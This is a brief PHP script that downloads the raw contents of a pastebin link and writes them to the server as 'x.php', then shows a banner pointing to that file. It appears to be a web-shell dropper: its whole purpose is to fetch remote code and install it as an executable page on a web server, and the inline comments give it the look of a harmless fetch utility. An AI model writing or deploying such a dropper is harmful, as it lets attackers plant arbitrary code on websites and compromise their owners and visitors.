<?php

$ch = curl_init();
$fp = fopen("x.php", "w");
$url = 'https://pastebin.com/raw/22L1yaV9';
curl_setopt($ch, CURLOPT_URL, $url);


//return the transfer (the result of curl_exec()) as a string instead of outputing directly
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

//puts the fetching result to $fp file handler
curl_setopt($ch, CURLOPT_FILE, $fp);

// execute the curl session
curl_exec($ch);

// close curl resource to free up system resources
curl_close($ch);

//close the file opened for writing
fclose($fp);

echo '<br /><center><div style="background-color:green;color:#fff;padding:10px;width:400px;font-size:16px">please check the file: <b>x.php</b> to see the results!</div></center>';
?>

